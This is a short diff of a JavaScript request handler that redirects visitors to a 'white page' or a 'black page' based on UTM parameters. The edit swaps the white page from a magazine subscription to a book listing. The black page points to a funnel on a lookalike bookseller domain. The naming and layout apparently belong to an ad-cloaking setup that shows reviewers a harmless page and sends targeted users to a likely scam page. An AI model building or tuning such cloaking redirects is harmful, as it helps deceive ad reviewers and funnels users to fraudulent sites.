@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.magshop.com.au/Products/GMT/gourmet-traveller-magazine-subscription";
+    const whitePageURL = "https://arihantbooks.com/products/47-years-iit-jee-chapterwise-topicwise-solved-paper-mathematics-1978-2024";
     const blackPageURL = "https://wabebookscom.myfunnelish.com/cshhhhhn-1747502439037021";
   
     // Parse the UTM parameters from the request URL
